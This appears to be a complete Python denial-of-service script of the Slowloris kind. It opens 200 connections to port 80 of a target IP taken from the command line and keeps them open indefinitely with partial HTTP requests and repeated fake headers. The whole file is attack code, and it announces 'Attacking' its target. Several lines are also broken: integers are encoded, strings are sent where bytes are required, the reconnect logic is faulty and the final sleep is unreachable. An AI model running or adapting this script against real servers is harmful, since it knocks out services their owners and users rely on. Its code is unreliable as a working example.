import socket
import random
import time
import sys

log_level = 2

def log(text, level = 1):
    if log_level >= level:
        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = sys.argv[1]
socket_count = 200
log(f'Attacking {ip} with {socket_count} sockets')

log('Creating sockets...')

for _ in range(socket_count):
    try:
        log(f'Creating socket nr. {_}', level = 2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, 80))
    
    except socket.error:
        break

    list_of_sockets.append(s)

log('Setting up sockets...')
for s in list_of_sockets:
    s.send(f"GET /?{random.randint(0,2000).encode('utf-8')} HTTP/1.1\r\n")
    for header in regular_headers:
        s.send(bytes(f"{header.encode('utf-8')}\r\n"))

while True:
    log('Sending keep-alive headers...')
    for s in list_of_sockets:
        try:
            s.send(f"X-a: {random.randint(1,5000).encode('utf-8')}\r\n")
        except socket.error:
            list_of_sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, 80))
                for s in list_of_sockets:
                    s.send(f"GET /?{random.randint(0,2000).encode('utf-8')} HTTP/1.1\r\n")
                    for header in regular_headers:
                        s.send(bytes(f"{header.encode('utf-8')}\r\n"))
                        
            except socket.error:
                continue

time.sleep(15)